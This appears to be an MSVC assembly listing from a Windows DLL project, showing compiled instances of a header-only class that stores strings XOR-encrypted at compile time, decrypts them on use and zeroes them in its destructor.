??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<24,-1071364949277595293,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-1071364949277595293,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<24,-1071364949277595293,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<24,-1071364949277595293,char>::~obfuscated_data<24,-1071364949277595293,char>, COMDAT

; 128  : 		{

	xorps	xmm0, xmm0

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<24,-1071364949277595293,char>::~obfuscated_data<24,-1071364949277595293,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@1@@Z PROC ; ay::obfuscated_data<24,-1071364949277595293,char>::obfuscated_data<24,-1071364949277595293,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r9, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+24], 1
	add	rcx, 23
	lea	rax, QWORD PTR [rdx+23]
	cmp	r9, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, r9
	sub	rdx, r9
	mov	ecx, 24
	npad	12
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	rcx, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	movups	xmm0, XMMWORD PTR [rdx]
	movsd	xmm1, QWORD PTR [rdx+16]
	movups	XMMWORD PTR [r9], xmm0
	movsd	QWORD PTR [r9+16], xmm1

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
??0?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@1@@Z ENDP ; ay::obfuscated_data<24,-1071364949277595293,char>::obfuscated_data<24,-1071364949277595293,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<31,-7365158476837733999,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<31,-7365158476837733999,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<31,-7365158476837733999,char>::~obfuscated_data<31,-7365158476837733999,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	xorps	xmm0, xmm0
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	mov	DWORD PTR [rcx+24], eax
	mov	WORD PTR [rcx+28], ax
	mov	BYTE PTR [rcx+30], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<31,-7365158476837733999,char>::~obfuscated_data<31,-7365158476837733999,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@AEBV?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@AEBV?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@1@@Z PROC ; ay::obfuscated_data<31,-7365158476837733999,char>::obfuscated_data<31,-7365158476837733999,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r8, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+31], 1
	add	rcx, 30
	lea	rax, QWORD PTR [rdx+30]
	cmp	r8, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	rax, r8
	sub	rdx, r8
	mov	r9d, 31
	npad	11
$LL15@obfuscated:
	movzx	ecx, BYTE PTR [rdx+rax]
	mov	BYTE PTR [rax], cl
	lea	rax, QWORD PTR [rax+1]
	sub	r9, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r8
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	eax, DWORD PTR [rdx+24]
	movups	xmm0, XMMWORD PTR [rdx]
	movsd	xmm1, QWORD PTR [rdx+16]
	movups	XMMWORD PTR [r8], xmm0
	movsd	QWORD PTR [r8+16], xmm1
	mov	DWORD PTR [r8+24], eax
	movzx	eax, WORD PTR [rdx+28]
	mov	WORD PTR [r8+28], ax
	movzx	eax, BYTE PTR [rdx+30]
	mov	BYTE PTR [r8+30], al

; 124  : 			}
; 125  : 		}

	mov	rax, r8
	ret	0
??0?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@AEBV?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@1@@Z ENDP ; ay::obfuscated_data<31,-7365158476837733999,char>::obfuscated_data<31,-7365158476837733999,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
??B?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<15,2868625218150416285,char>::operator char *, COMDAT

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rcx+15], 0

; 139  : 		{

	mov	r8, rcx

; 147  : 			if ( m_encrypted )

	je	$LN29@operator

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	eax, eax
	cmp	DWORD PTR __isa_available, 5
	jl	$LN28@operator

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	eax, WORD PTR [rcx]
	movdqa	xmm3, XMMWORD PTR __xmm@27cf676ff1953f9d27cf676ff1953f9d
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx], ax
	movzx	eax, WORD PTR [rcx+2]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+2], ax
	movzx	eax, WORD PTR [rcx+4]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	movd	eax, xmm1
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	mov	WORD PTR [rcx+4], ax
	movzx	eax, WORD PTR [rcx+6]
	pshufb	xmm1, xmm2
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rcx+6], ax
	mov	eax, 8
$LN28@operator:
	mov	r9, 2868625218150416285			; 27cf676ff1953f9dH
$LL27@operator:
	movzx	ecx, al
	mov	rdx, r9
	and	cl, 7
	shl	cl, 3
	shr	rdx, cl
	xor	BYTE PTR [r8+rax], dl
	inc	rax
	cmp	rax, 15
	jb	SHORT $LL27@operator

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [r8+15], 0
$LN29@operator:

; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}

	mov	rax, r8
	ret	0
??B?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<15,2868625218150416285,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<15,2868625218150416285,char>::~obfuscated_data<15,2868625218150416285,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	DWORD PTR [rcx+8], eax
	mov	WORD PTR [rcx+12], ax
	mov	BYTE PTR [rcx+14], al

; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<15,2868625218150416285,char>::~obfuscated_data<15,2868625218150416285,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@1@@Z PROC ; ay::obfuscated_data<15,2868625218150416285,char>::obfuscated_data<15,2868625218150416285,char>, COMDAT

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+15], 1
	movzx	eax, BYTE PTR [rdx]
	mov	BYTE PTR [rcx], al
	movzx	eax, BYTE PTR [rdx+1]
	mov	BYTE PTR [rcx+1], al
	movzx	eax, BYTE PTR [rdx+2]
	mov	BYTE PTR [rcx+2], al
	movzx	eax, BYTE PTR [rdx+3]
	mov	BYTE PTR [rcx+3], al
	movzx	eax, BYTE PTR [rdx+4]
	mov	BYTE PTR [rcx+4], al
	movzx	eax, BYTE PTR [rdx+5]
	mov	BYTE PTR [rcx+5], al
	movzx	eax, BYTE PTR [rdx+6]
	mov	BYTE PTR [rcx+6], al
	movzx	eax, BYTE PTR [rdx+7]
	mov	BYTE PTR [rcx+7], al
	movzx	eax, BYTE PTR [rdx+8]
	mov	BYTE PTR [rcx+8], al
	movzx	eax, BYTE PTR [rdx+9]
	mov	BYTE PTR [rcx+9], al
	movzx	eax, BYTE PTR [rdx+10]
	mov	BYTE PTR [rcx+10], al
	movzx	eax, BYTE PTR [rdx+11]
	mov	BYTE PTR [rcx+11], al
	movzx	eax, BYTE PTR [rdx+12]
	mov	BYTE PTR [rcx+12], al
	movzx	eax, BYTE PTR [rdx+13]
	mov	BYTE PTR [rcx+13], al
	movzx	eax, BYTE PTR [rdx+14]
	mov	BYTE PTR [rcx+14], al
	mov	rax, rcx
	ret	0
??0?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@1@@Z ENDP ; ay::obfuscated_data<15,2868625218150416285,char>::obfuscated_data<15,2868625218150416285,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ PROC ; ay::obfuscated_data<16,-1909597575049685103,char>::operator char *, COMDAT

; 139  : 		{

$LN4:
	sub	rsp, 40					; 00000028H
	mov	r11, rcx

; 140  : 			decrypt();

	call	?decrypt@?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<16,-1909597575049685103,char>::decrypt

; 141  : 			return m_data;

	mov	rax, r11

; 142  : 		}

	add	rsp, 40					; 00000028H
	ret	0
??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ ENDP ; ay::obfuscated_data<16,-1909597575049685103,char>::operator char *
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??1?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@XZ PROC ; ay::obfuscated_data<16,-1909597575049685103,char>::~obfuscated_data<16,-1909597575049685103,char>, COMDAT

; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;

	mov	QWORD PTR [rcx], 0
	mov	QWORD PTR [rcx+8], 0

; 133  : 			}
; 134  : 		}

	ret	0
??1?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@XZ ENDP ; ay::obfuscated_data<16,-1909597575049685103,char>::~obfuscated_data<16,-1909597575049685103,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??0?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@AEBV?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@1@@Z
_TEXT	SEGMENT
this$ = 8
obfuscator$ = 16
??0?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@AEBV?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@1@@Z PROC ; ay::obfuscated_data<16,-1909597575049685103,char>::obfuscated_data<16,-1909597575049685103,char>, COMDAT

; 118  : 		obfuscated_data(const obfuscator<N, KEY, CHAR_TYPE>& obfuscator)

	mov	r9, rcx

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+16], 1
	add	rcx, 15
	lea	rax, QWORD PTR [rdx+15]
	cmp	r9, rax
	ja	SHORT $LN10@obfuscated
	cmp	rcx, rdx
	jb	SHORT $LN10@obfuscated

; 119  : 		{
; 120  : 			// Copy obfuscated data
; 121  : 			for ( size_type i = 0; i < N; i++ )
; 122  : 			{
; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	r8, r9
	sub	rdx, r9
	mov	ecx, 16
	npad	12
$LL15@obfuscated:
	movzx	eax, BYTE PTR [rdx+r8]
	mov	BYTE PTR [r8], al
	lea	r8, QWORD PTR [r8+1]
	sub	rcx, 1
	jne	SHORT $LL15@obfuscated

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
$LN10@obfuscated:

; 126  : 
; 127  : 		~obfuscated_data()
; 128  : 		{
; 129  : 			// Zero m_data to remove it from memory
; 130  : 			for ( size_type i = 0; i < N; i++ )
; 131  : 			{
; 132  : 				m_data[i] = 0;
; 133  : 			}
; 134  : 		}
; 135  : 
; 136  : 		// Returns a pointer to the plain text string, decrypting it if
; 137  : 		// necessary
; 138  : 		operator CHAR_TYPE* ( )
; 139  : 		{
; 140  : 			decrypt();
; 141  : 			return m_data;
; 142  : 		}
; 143  : 
; 144  : 		// Manually decrypt the string
; 145  : 		void decrypt()
; 146  : 		{
; 147  : 			if ( m_encrypted )
; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);
; 150  : 				m_encrypted = false;
; 151  : 			}
; 152  : 		}
; 153  : 
; 154  : 		// Manually re-encrypt the string
; 155  : 		void encrypt()
; 156  : 		{
; 157  : 			if ( !m_encrypted )
; 158  : 			{
; 159  : 				cipher(m_data, N, KEY);
; 160  : 				m_encrypted = true;
; 161  : 			}
; 162  : 		}
; 163  : 
; 164  : 		// Returns true if this string is currently encrypted, false otherwise.
; 165  : 		bool is_encrypted() const
; 166  : 		{
; 167  : 			return m_encrypted;
; 168  : 		}
; 169  : 
; 170  : 	private:
; 171  : 
; 172  : 		// Local storage for the string. Call is_encrypted() to check whether or
; 173  : 		// not the string is currently obfuscated.
; 174  : 		CHAR_TYPE m_data[N];
; 175  : 
; 176  : 		// Whether data is currently encrypted
; 177  : 		bool m_encrypted{ true };

	movups	xmm0, XMMWORD PTR [rdx]
	movups	XMMWORD PTR [r9], xmm0

; 124  : 			}
; 125  : 		}

	mov	rax, r9
	ret	0
??0?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@AEBV?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@1@@Z ENDP ; ay::obfuscated_data<16,-1909597575049685103,char>::obfuscated_data<16,-1909597575049685103,char>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 48
